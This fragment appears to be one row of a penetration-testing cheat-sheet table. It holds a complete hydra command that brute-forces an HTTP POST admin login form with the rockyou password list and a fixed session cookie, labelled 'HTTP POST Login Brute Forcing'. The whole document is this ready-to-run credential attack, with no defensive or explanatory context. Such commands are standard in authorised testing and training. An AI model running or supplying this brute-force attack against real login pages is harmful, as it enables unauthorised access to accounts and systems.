...
|  hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/admin/:user=admin&pass=^PASS^:F=invalid:H=Cookie: PHPSESSID=rj5dvuhj7fatr7ultopsb8b4f0" | HTTP POST Login Brute Forcing |
